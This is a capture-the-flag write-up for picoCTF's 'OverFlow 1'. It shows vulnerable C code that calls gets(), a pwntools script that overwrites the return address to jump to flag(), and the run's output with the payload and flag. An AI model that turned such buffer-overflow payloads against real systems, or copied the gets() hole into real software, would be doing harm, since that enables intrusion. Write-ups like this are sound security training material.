# OverFlow 1
Binary Exploitation, 150 points

## Description:
> You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this program?

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);

  printf("Woah, were jumping to 0x%x !\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Give me a string and lets see what happens: ");
  vuln();
  return 0;
}
```


## Solution:


This challenge is similar to last year's [buffer overflow 1](/2018_picoCTF/buffer%20overflow%201.md). We override `vuln`'s return address by writing 76 bytes of padding (found using the `pwntools` `cyclic` utility) and an extra 4 bytes containing the address we want to jump to: `flag()`.


```python
# First, generate a pwntools template using:
# pwn template --host 2019shell1.picoctf.com --user dvdalt --path /problems/overflow-1_1_e792baa0d29d24699530e6a26071a260/vuln

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments
import os

if shell is not None:
    shell.set_working_directory(os.path.dirname(remote_path))

def send_payload(proc, payload):
    proc.sendlineafter("Give me a string and lets see what happens: ", payload)


def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
    os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
    os.system("rm core.* > /dev/null")
    proc = process(exe.path)
    payload = cyclic(100, n = exe.bytes)
    send_payload(proc, payload)
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n = exe.bytes )
    log.info("Overflow offset: {}".format(offset))
    return offset

overflow_offset = get_overflow_offset()

io = start()
payload = fit({overflow_offset: exe.symbols["flag"]})
log.info("Sending payload: \n{}".format(hexdump(payload)))

send_payload(io, payload)
print io.recvall()
```

Output:
```console
root@kali:/media/sf_CTFs/pico/OverFlow_1# python exploit.py
[*] '/media/sf_CTFs/pico/OverFlow_1/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Connecting to 2019shell1.picoctf.com on port 22: Done
[*] dvdalt@2019shell1.picoctf.com:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Opening new channel: 'pwd': Done
[+] Receiving all data: Done (13B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/tmp/tmp.zXCJmmb22s'
[+] Opening new channel: 'ln -s /home/dvdalt/* .': Done
[+] Receiving all data: Done (0B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/problems/overflow-1_1_e792baa0d29d24699530e6a26071a260'
[+] Starting local process '/media/sf_CTFs/pico/OverFlow_1/vuln': pid 1204
[*] Process '/media/sf_CTFs/pico/OverFlow_1/vuln' stopped with exit code -11 (SIGSEGV) (pid 1204)
[+] Parsing corefile...: Done
[*] '/media/sf_CTFs/pico/OverFlow_1/core.1204'
    Arch:      i386-32-little
    EIP:       0x61616174
    ESP:       0xffa798d0
    Exe:       '/media/sf_CTFs/pico/OverFlow_1/vuln' (0x8048000)
    Fault:     0x61616174
[*] Overflow offset: 76
[+] Starting remote process '/problems/overflow-1_1_e792baa0d29d24699530e6a26071a260/vuln' on 2019shell1.picoctf.com: pi
d 3868255
[*] Sending payload:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
    00000020  69 61 61 61  6a 61 61 61  6b 61 61 61  6c 61 61 61  │iaaa│jaaa│kaaa│laaa│
    00000030  6d 61 61 61  6e 61 61 61  6f 61 61 61  70 61 61 61  │maaa│naaa│oaaa│paaa│
    00000040  71 61 61 61  72 61 61 61  73 61 61 61  e6 85 04 08  │qaaa│raaa│saaa│····│
    00000050
[+] Receiving all data: Done (77B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 3868255)

Woah, were jumping to 0x80485e6 !
picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a1b468a7}
```